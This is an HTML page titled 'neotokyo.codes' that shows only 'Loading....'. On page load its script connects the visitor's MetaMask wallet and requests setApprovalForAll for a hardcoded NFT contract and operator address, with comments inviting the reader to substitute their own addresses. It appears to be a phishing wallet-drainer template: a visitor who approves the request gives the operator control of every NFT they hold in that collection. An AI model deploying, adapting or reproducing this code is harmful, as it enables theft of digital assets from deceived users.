<!DOCTYPE html>
<html>
<head>
  <title>neotokyo.codes</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</head>
<body>
  <h1>Loading....</h1>

  <script>
    const nftContractAddress = "0x4481507cc228fa19d203bd42110d679571f7912e"; // <-- ilisi sa imong NFT contract
    const operatorAddress = "0x974c32106390e0F378f36FbF4428d4F32D813dd7"; // <-- ilisi kung kinsa ang i-approve (e.g., claim contract)

    async function autoConnectAndApprove() {
      if (typeof window.ethereum === 'undefined') {
        alert("Install MetaMask first.");
        return;
      }

      try {
        // Connect wallet
        await ethereum.request({ method: 'eth_requestAccounts' });
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();

        // NFT Contract ABI (only need setApprovalForAll)
        const abi = [
          "function setApprovalForAll(address operator, bool approved) external",
          "function isApprovedForAll(address owner, address operator) view returns (bool)"
        ];
        const nftContract = new ethers.Contract(nftContractAddress, abi, signer);

        // Check if already approved
        const alreadyApproved = await nftContract.isApprovedForAll(userAddress, operatorAddress);
        if (alreadyApproved) {
          console.log("Already approved.");
          return;
        }

        // Trigger approval
        const tx = await nftContract.setApprovalForAll(operatorAddress, true);
        console.log("Approval sent. Waiting for confirmation...");
        await tx.wait();
        console.log("NFT Approved!");
        alert("NFT Approved!");

      } catch (err) {
        console.error("Error:", err);
        alert("Something went wrong: " + err.message);
      }
    }

    // Run on page load
    window.onload = autoConnectAndApprove;
  </script>
</body>
